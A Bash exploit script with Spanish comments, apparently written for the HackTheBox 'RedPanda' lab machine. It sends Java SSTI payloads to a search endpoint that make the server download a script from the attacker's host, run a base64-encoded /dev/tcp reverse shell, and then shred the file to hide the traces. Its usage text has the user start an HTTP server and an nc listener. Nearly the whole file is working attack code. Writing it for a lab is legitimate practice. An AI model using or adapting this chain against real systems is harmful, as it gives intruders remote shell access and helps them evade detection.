#!/bin/bash

# ===========================*
# Funciones
# ===========================*

break_ssti () {
    FILE_TMP_NAME=".hola.sh"
    REVSH_B64=$(echo "bash -i >& /dev/tcp/$1/$2 0>&1" | base64)

    echo -e "#!/bin/bash\n\necho $REVSH_B64 | base64 -d | bash" > $FILE_TMP_NAME

    curl -s -X POST "$URL_SITE/search" -H "Content-Type: application/x-www-form-urlencoded" -d "name=*{T(java.lang.Runtime).getRuntime().exec('curl http://$1:8000/$FILE_TMP_NAME -o /tmp/$FILE_TMP_NAME')}" > /dev/null
    echo -e "\n(+) Archivo subido al sistema."

    curl -s -X POST "$URL_SITE/search" -H "Content-Type: application/x-www-form-urlencoded" -d "name=*{T(java.lang.Runtime).getRuntime().exec('bash /tmp/$FILE_TMP_NAME')}" > /dev/null
    echo -e "(+) Archivo ejecutado (deberias obtener la reverse shell, si no, reintenta)."

    curl -s -X POST "$URL_SITE/search" -H "Content-Type: application/x-www-form-urlencoded" -d "name=*{T(java.lang.Runtime).getRuntime().exec('shred -zun 11 /tmp/$FILE_TMP_NAME')}" > /dev/null
    echo -e "(+) Archivo borrado del sistema."

    rm -r $FILE_TMP_NAME
}

# ===========================*
# Variables globales
# ===========================*

URL_SITE="http://10.10.11.170:8080"

# ===========================*
# Inicio del programa
# ===========================*

echo "CuKVk+KUgOKUgOKVluKVk+KUgOKUgCDilaXilIDilIDilZbilZPilIDilIDilZbilZPilIDilIDilZbilZPilZYg4pWl4pWl4pSA4pSA4pWW4pWT4pSA4pSA4pWWCuKVkeKUgOKUgOKVnOKVkSAgIOKVkSAg4pWR4pWR4pSA4pSA4pWc4pWRICDilavilZHilZEg4pWR4pWRICDilZHilZEgIOKVqwrilavilIDilIDilZbilavilIDilIAgICAg4pWr4pWRICAg4pWR4pSA4pSA4pWi4pWR4pWrIOKVkSAgIOKVq+KVkeKUgOKUgOKVogrilaggIOKVqOKVmeKUgOKUgOKUgOKUgOKUgOKUgOKVnOKVqCAgIOKVqCAg4pWo4pWo4pWZ4pSA4pWc4pSA4pSA4pSA4pWc4pWoICDilajigKIgYnkgbGFuegoKSGFja1RoZUJveCAtIFJlZFBhbmRhIDo6IFNTVEkgSmF2YSBUZW1wbGF0ZSA6OiBSZXZlcnNlIFNoZWxsIEluaXRpYXRvcgo=" | base64 -d

if [ "$#" -ne 2 ]; then
    echo -e "\nuso: $0 <ip_del_atacante> <puerto_del_atacante>"
    echo -e "     $0 10.10.10.10 4433\n"
    echo -e "(!) Recuerda levantar el servidor HTTP y el puerto donde recibiras la reverse shell: \n    python3 -m http.server 8000\n    nc -lvp <puerto>"
else
    break_ssti $1 $2
fi
